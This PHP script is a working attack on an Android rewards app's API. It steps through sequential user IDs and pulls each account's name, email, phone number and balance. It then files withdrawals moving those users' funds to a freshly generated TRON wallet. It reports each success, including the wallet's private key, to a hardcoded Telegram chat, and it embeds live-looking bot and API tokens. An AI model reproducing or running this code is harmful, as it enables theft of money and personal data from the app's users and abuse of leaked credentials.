<?php
error_reporting(0);
define('TOKEN_BOT', '6487821820:AAElTFyyBSxBj2gVr795VgXB3BNAzEgDvxE');
function sendTelegramMessage($chatId, $message) {
    $url = "https://api.telegram.org/bot" . TOKEN_BOT . "/sendMessage";
    $postData = http_build_query(array(
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => "markdown"
    ));

    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => $postData
        )
    );

    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    return $result;
}

$id = readline("ID: ");
$endpoint = 'https://api.chaingateway.io/v2/tron/addresses';

$headers = [
    'Accept: application/json',
    'Authorization: ghl2ckd080gck0oo8g48cgwk84k8kggsckscg4kwgo8848oggw80k8kc8ckswgg4',
];

$ch = curl_init($endpoint);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');

$response = curl_exec($ch);

if (curl_errno($ch)) {
    echo 'cURL error: ' . curl_error($ch);
}

curl_close($ch);


$data = json_decode($response, true);

if ($data['status'] === 200) {
    $privateKey = $data['data']['privateKey'];
    $address = $data['data']['address'];
    $hexAddress = $data['data']['hexAddress'];

    echo "Private Key: $privateKey\n";
    echo "Address: $address\n";
    echo "Hex Address: $hexAddress\n";
} else {
    echo "Error: {$data['message']}\n";
}
$sntot = 0;
for($i=1;$i<=450000;$i++){

$url = "https://smartjob.amandroidapps.com/api/user/profile/info";
$data = array(
    "user_id" => $id
);
echo "\rID: $id \r";
$headers = array(
    "Host: smartjob.amandroidapps.com",
    "Authorization: INGHHJEGHJEUDFGHYSBW7583546837NUDD75465546",
    "Content-Type: application/x-www-form-urlencoded",
    "User-Agent: okhttp/5.0.0-alpha.2"
);

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$response = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error: ' . curl_error($ch);
}

curl_close($ch);
$js = json_decode($response);
//var_dump($js);
if ($js->message == "Data Found") {
    $name = $js->data->name;
    $email = $js->data->email;
    $contact = $js->data->contact;
    $balance = $js->data->balance;
    $refferal_balance = $js->data->refferal_balance;
    echo "Balance: $balance\n";
    $ss = explode(".",$balance);
    if($ss[0] >= 2){
    	$url = "https://smartjob.amandroidapps.com/api/submit/withdraw";
$data = array(
    "user_id" => $id,
    "trx" => "2",
    "payment_title" => "TRON TRX (TRC20)",
    "user_wallet_address" => $address
);

$headers = array(
    "Authorization: INGHHJEGHJEUDFGHYSBW7583546837NUDD75465546",
    "Content-Type: application/x-www-form-urlencoded",
    "Host: smartjob.amandroidapps.com",
    "Connection: Keep-Alive",
    "User-Agent: okhttp/5.0.0-alpha.2"
);

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$response = curl_exec($ch);

if (curl_errno($ch)) {
    echo 'Error: ' . curl_error($ch);
}

curl_close($ch);

if ($response) {
    $responseData = json_decode($response, true);
    if (isset($responseData["success"]) && $responseData["success"] === true) {
    	$chatId = "1397941074";
    $sntot++;
$message = "===================\nSUKSES WD\nID: $id\nAddress: `$address`\nPK: `$privateKey`\n===================\n";
$response = sendTelegramMessage($chatId, $message);
if ($response === false) {
    echo "Pesan tidak terkirim.\n";
} else {
    echo "Pesan berhasil terkirim.\n";
}
        echo "ID: $id | Sukses: " . $responseData["message"]."\n";
    } else {
        echo "ID: $id | AKUN BANNED\n";
    }
} else {
    echo "Tidak ada respons dari server.";
}
    }
}else{
	
}
if($sntot >= 2){
	break;
	}
$id++;


}


